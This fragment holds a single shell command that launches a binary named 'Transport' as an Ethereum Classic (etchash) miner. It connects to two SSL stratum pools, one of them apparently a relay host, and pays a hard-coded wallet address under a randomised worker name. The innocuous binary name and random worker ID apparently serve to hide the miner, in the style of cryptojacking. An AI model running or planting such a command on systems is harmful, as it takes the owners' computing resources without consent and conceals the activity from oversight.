...
./Transport -a etchash -o stratum+ssl://etc-sg.flexpool.io:5555 -o stratum+ssl://sgeetc.gfwroute.co:5555 -u 0x11880b1cfe04907c5306222be1e09f4bbb480eb5 -p x -w $(echo $(shuf -i 1-9999 -n 1)-sty)
